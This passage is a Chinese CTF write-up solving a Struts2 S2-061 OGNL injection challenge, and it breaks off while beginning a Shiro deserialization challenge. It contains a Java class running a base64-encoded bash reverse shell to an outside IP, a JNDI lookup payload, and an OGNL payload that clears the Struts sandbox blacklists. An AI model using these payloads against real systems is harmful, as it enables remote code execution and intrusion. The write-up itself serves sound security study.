<p>尝试访问<code>http://192.168.238.165:49154/index.action?id=%25%7B1%2B1%7D</code>发现回显中的超链接变成了<code>&lt;a id=&quot;2&quot; href=&quot;./asserts/%{1+1}.jpg&quot;&gt;Go to see the photo!&lt;/a&gt;</code>，找到注入点。payload和分析可以参考</p>
<p><a href="https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/Struts2%20s2-061%20Poc%20(CVE-2020-17530).md">https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/Struts2%20s2-061%20Poc%20(CVE-2020-17530).md</a></p>
<p>这里是OGNL表达式，和上面的SpringEL其实大同小异.贴一下官方文档</p>
<p><a href="https://commons.apache.org/proper/commons-ognl/language-guide.html">https://commons.apache.org/proper/commons-ognl/language-guide.html</a></p>
<p>但是题目是有waf的</p>
<p><img src="https://s2.loli.net/2022/11/01/XAIWz3r24Ce5HVv.png" alt=""></p>
<p>第一种思路，用上面payload的jndi注入。</p>
<p>jndi服务用marshalsec来搭</p>
<p>写一个恶意类弹shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">UnicodeSec</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            String cmd<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80OS4yMzIuMjAxLjE2My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span>cmd<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>IOException e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            e<span style="color:#ff79c6">.</span><span style="color:#50fa7b">printStackTrace</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>编译之后把class放到nginx服务器上，marshalsec再指定即可。</p>
<p>脚本发包</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span>url<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://192.168.238.165:49154/index.action&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># url=&#34;http://localhost:32131/web2_war_exploded/index.action&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">go</span>(<span style="color:#8be9fd;font-style:italic">id</span>):
</span></span><span style="display:flex;"><span>    c1<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;6T0FSVYG58zhpPB3zslJ7lBiHLcUALk+GblpyVh9xnRaOTzVsSnjUZJhcwoi14eJN9URv29TbkMwNWaCPDZ+8wNVLB/E/YpZsjNJPEfyQSWRFFoLQhsCb5b+YECiNYpb3554e0l4+jC2IdzgcJBQEIEX3HRcyR7aAdaRoTNfu3zxX4OR4ZPodBCGpH2YNeqU&#34;</span>}
</span></span><span style="display:flex;"><span>    text<span style="color:#ff79c6">=</span>requests<span style="color:#ff79c6">.</span>get(url<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;?id=&#34;</span><span style="color:#ff79c6">+</span>encode_all(<span style="color:#8be9fd;font-style:italic">id</span>),cookies<span style="color:#ff79c6">=</span>c1)<span style="color:#ff79c6">.</span>text
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(text)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">encode_all</span>(string):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join(<span style="color:#f1fa8c">&#34;%</span><span style="color:#f1fa8c">{0:0&gt;2}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">format</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(char), <span style="color:#f1fa8c">&#34;x&#34;</span>)) <span style="color:#ff79c6">for</span> char <span style="color:#ff79c6">in</span> string)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;%{(&#39;Powered_by_Unicode_Potats0,enjoy_it&#39;).(#UnicodeSec = #application[&#39;org.apache.tomcat.InstanceManager&#39;]).(#rw=#UnicodeSec.newInstance(&#39;com.sun.rowset.JdbcRowSetImpl&#39;)).(#rw.setDataSourceName(&#39;ldap://xxx:2334/UnicodeSec&#39;)).(#rw.getDatabaseMetaData())}&#34;</span>
</span></span><span style="display:flex;"><span>    go(<span style="color:#8be9fd;font-style:italic">id</span>)
</span></span></code></pre></div><p>然鹅复现失败了QwQ..ldap和rmi都不行（未来穿越的我：jdk高版本jndi可以绕），而且脚本小子不太会debug 555</p>
<p>不过题目的预期解也不是要弹shell，观察Unserialize类</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> WEB<span style="color:#ff79c6">-</span>INF<span style="color:#ff79c6">.</span><span style="color:#50fa7b">classes</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">ctf</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">minil</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">utils</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ctf.minil.models.User<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ByteArrayInputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.File<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.FileInputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.IOException<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.ObjectInputStream<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.nio.file.Files<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.nio.file.attribute.BasicFileAttributes<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Base64<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Unserialize</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd;font-style:italic">public</span> Object <span style="color:#50fa7b">unserialize</span><span style="color:#ff79c6">(</span>String obj<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> ClassNotFoundException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> bytes <span style="color:#ff79c6">=</span> Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getDecoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">decode</span><span style="color:#ff79c6">(</span>obj<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    ByteArrayInputStream bis <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayInputStream<span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    ObjectInputStream ois <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectInputStream<span style="color:#ff79c6">(</span>bis<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      String name <span style="color:#ff79c6">=</span> ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readUTF</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>      <span style="color:#8be9fd">int</span> year <span style="color:#ff79c6">=</span> ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readInt</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>name<span style="color:#ff79c6">.</span><span style="color:#50fa7b">equals</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;MiniLCTF&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">&amp;&amp;</span> year <span style="color:#ff79c6">==</span> 2022<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        File file <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> File<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/flag&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        BasicFileAttributes basicFileAttributes <span style="color:#ff79c6">=</span> Files<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readAttributes</span><span style="color:#ff79c6">(</span>file<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toPath</span><span style="color:#ff79c6">(),</span> BasicFileAttributes<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">new</span> java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">nio</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">file</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">LinkOption</span><span style="color:#ff79c6">[</span>0<span style="color:#ff79c6">]);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>basicFileAttributes<span style="color:#ff79c6">.</span><span style="color:#50fa7b">isRegularFile</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">&amp;&amp;</span> file<span style="color:#ff79c6">.</span><span style="color:#50fa7b">exists</span><span style="color:#ff79c6">())</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>          <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> fileContent <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[(</span><span style="color:#8be9fd">int</span><span style="color:#ff79c6">)</span>basicFileAttributes<span style="color:#ff79c6">.</span><span style="color:#50fa7b">size</span><span style="color:#ff79c6">()];</span>
</span></span><span style="display:flex;"><span>          FileInputStream in <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> FileInputStream<span style="color:#ff79c6">(</span>file<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>          in<span style="color:#ff79c6">.</span><span style="color:#50fa7b">read</span><span style="color:#ff79c6">(</span>fileContent<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>          in<span style="color:#ff79c6">.</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">new</span> User<span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">(</span>fileContent<span style="color:#ff79c6">),</span> <span style="color:#f1fa8c">&#34;947866&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> 
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">}</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">return</span> ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>能调用Unserialze反序列化特定的user就能返回flag。仔细阅读一下上面的payload分析，发现可以用<code>org.apache.tomcat.InstanceManager#newInstance</code>实例化任意无参构造方法的类并返回（只要不在OGNL的黑名单里。</p>
<p>另外#res这个变量似乎可以控制整个OGNL的返回值。所以先搞一个user</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> ctf.minil.models<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.*<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.Base64<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ctf.minil.utils.Unserialize<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">fakeUser</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">main</span><span style="color:#ff79c6">(</span>String<span style="color:#ff79c6">[]</span> args<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span>  Exception<span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        User u<span style="color:#ff79c6">=</span><span style="color:#ff79c6">new</span> User<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        ByteArrayOutputStream bos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ByteArrayOutputStream<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        ObjectOutputStream oos <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ObjectOutputStream<span style="color:#ff79c6">(</span>bos<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeUTF</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;MiniLCTF&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeInt</span><span style="color:#ff79c6">(</span>2022<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>u<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">byte</span><span style="color:#ff79c6">[]</span> bytes <span style="color:#ff79c6">=</span> bos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toByteArray</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        String encode<span style="color:#ff79c6">=</span>Base64<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getEncoder</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">encodeToString</span><span style="color:#ff79c6">(</span>bytes<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span>encode<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//        new Unserialize().unserialize(encode);
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>改一下exec的payload</p>
<p><code>%{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).(#potats0.put('excludedPackageNames',#emptySet)).(#un=#UnicodeSec.newInstance('ctf.minil.utils.Unserialize')).(#flag=#un.unserialize('上面的base64').getName()).(#res=#flag)}</code></p>
<p>然后发包</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> requests
</span></span><span style="display:flex;"><span>url<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;http://192.168.238.165:49154/index.action&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4"># url=&#34;http://localhost:32131/web2_war_exploded/index.action&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">go</span>(<span style="color:#8be9fd;font-style:italic">id</span>):
</span></span><span style="display:flex;"><span>    c1<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#34;token&#34;</span>:<span style="color:#f1fa8c">&#34;6T0FSVYG58zhpPB3zslJ7lBiHLcUALk+GblpyVh9xnRaOTzVsSnjUZJhcwoi14eJN9URv29TbkMwNWaCPDZ+8wNVLB/E/YpZsjNJPEfyQSWRFFoLQhsCb5b+YECiNYpb3554e0l4+jC2IdzgcJBQEIEX3HRcyR7aAdaRoTNfu3zxX4OR4ZPodBCGpH2YNeqU&#34;</span>}
</span></span><span style="display:flex;"><span>    text<span style="color:#ff79c6">=</span>requests<span style="color:#ff79c6">.</span>get(url<span style="color:#ff79c6">+</span><span style="color:#f1fa8c">&#34;?id=&#34;</span><span style="color:#ff79c6">+</span>encode_all(<span style="color:#8be9fd;font-style:italic">id</span>),cookies<span style="color:#ff79c6">=</span>c1)<span style="color:#ff79c6">.</span>text
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(text)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">encode_all</span>(string):
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join(<span style="color:#f1fa8c">&#34;%</span><span style="color:#f1fa8c">{0:0&gt;2}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">format</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(char), <span style="color:#f1fa8c">&#34;x&#34;</span>)) <span style="color:#ff79c6">for</span> char <span style="color:#ff79c6">in</span> string)
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__<span style="color:#ff79c6">==</span><span style="color:#f1fa8c">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># id=&#34;%{(&#39;Powered_by_Unicode_Potats0,enjoy_it&#39;).(#UnicodeSec = #application[&#39;org.apache.tomcat.InstanceManager&#39;]).(#rw=#UnicodeSec.newInstance(&#39;com.sun.rowset.JdbcRowSetImpl&#39;)).(#rw.setDataSourceName(&#39;rmi://49.232.201.163:2334/UnicodeSec&#39;)).(#rw.getDatabaseMetaData())}&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;%{(&#39;Powered_by_Unicode_Potats0,enjoy_it&#39;).(#UnicodeSec = #application[&#39;org.apache.tomcat.InstanceManager&#39;]).(#potats0=#UnicodeSec.newInstance(&#39;org.apache.commons.collections.BeanMap&#39;)).(#stackvalue=#attr[&#39;struts.valueStack&#39;]).(#potats0.setBean(#stackvalue)).(#context=#potats0.get(&#39;context&#39;)).(#potats0.setBean(#context)).(#sm=#potats0.get(&#39;memberAccess&#39;)).(#emptySet=#UnicodeSec.newInstance(&#39;java.util.HashSet&#39;)).(#potats0.setBean(#sm)).(#potats0.put(&#39;excludedClasses&#39;,#emptySet)).(#potats0.put(&#39;excludedPackageNames&#39;,#emptySet)).(#un=#UnicodeSec.newInstance(&#39;ctf.minil.utils.Unserialize&#39;)).(#flag=#un.unserialize(&#39;rO0ABXcOAAhNaW5pTENURgAAB+ZzcgAVY3RmLm1pbmlsLm1vZGVscy5Vc2VyAAAAAAAAAAECAANJAAR5ZWFyTAAIcGFzc3dvcmR0ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHAAAAAAdAAAcQB+AAM=&#39;).getUsername()).(#res=#flag)}&#34;</span>
</span></span><span style="display:flex;"><span>    go(<span style="color:#8be9fd;font-style:italic">id</span>)
</span></span></code></pre></div><p>返回的id就是flag</p>
<h1 id="车联网ezcc">车联网ezcc</h1>
<p>shrio反序列化</p>
<p>serialkiller.conf</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">&lt;!-- serialkiller.conf --&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;config&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;refresh&gt;</span>6000<span style="color:#ff79c6">&lt;/refresh&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;blacklist&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;regexp&gt;</span>^org\.apache\.commons\.collections\.functors\.InvokerTransformer$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;regexp&gt;</span>^org\.apache\.commons\.beanutils\.BeanComparator$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;regexp&gt;</span>^org\.apache\.commons\.collections\.functors\.ConstantTransformer$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;regexp&gt;</span>^java\.rmi\.server\.RemoteObjectInvocationHandler$<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/blacklist&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;whitelist&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;regexp&gt;</span>.*<span style="color:#ff79c6">&lt;/regexp&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/whitelist&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;logging&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;enabled&gt;</span>false<span style="color:#ff79c6">&lt;/enabled&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/logging&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;/config&gt;</span>
</span></span></code></pre></div><p>pom.xml</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#ff79c6">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">&lt;project</span> <span style="color:#50fa7b">xmlns=</span><span style="color:#f1fa8c">&#34;http://maven.apache.org/POM/4.0.0&#34;</span> <span style="color:#50fa7b">xmlns:xsi=</span><span style="color:#f1fa8c">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">xsi:schemaLocation=</span><span style="color:#f1fa8c">&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;</span><span style="color:#ff79c6">&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;modelVersion&gt;</span>4.0.0<span style="color:#ff79c6">&lt;/modelVersion&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;groupId&gt;</span>com.govuln<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;artifactId&gt;</span>shirodemo<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;version&gt;</span>1.0-SNAPSHOT<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;packaging&gt;</span>war<span style="color:#ff79c6">&lt;/packaging&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;name&gt;</span>shirodemo Maven Webapp<span style="color:#ff79c6">&lt;/name&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;url&gt;</span>http://www.example.com<span style="color:#ff79c6">&lt;/url&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;properties&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;project.build.sourceEncoding&gt;</span>UTF-8<span style="color:#ff79c6">&lt;/project.build.sourceEncoding&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;maven.compiler.source&gt;</span>1.7<span style="color:#ff79c6">&lt;/maven.compiler.source&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;maven.compiler.target&gt;</span>1.7<span style="color:#ff79c6">&lt;/maven.compiler.target&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;/properties&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&lt;dependencies&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;groupId&gt;</span>org.apache.shiro<span style="color:#ff79c6">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;artifactId&gt;</span>shiro-core<span style="color:#ff79c6">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;version&gt;</span>1.2.4<span style="color:#ff79c6">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;/dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">&lt;groupId&gt;</span>org.apache.shiro<span style="color:#ff79c6">&lt;/groupId&gt;</span>
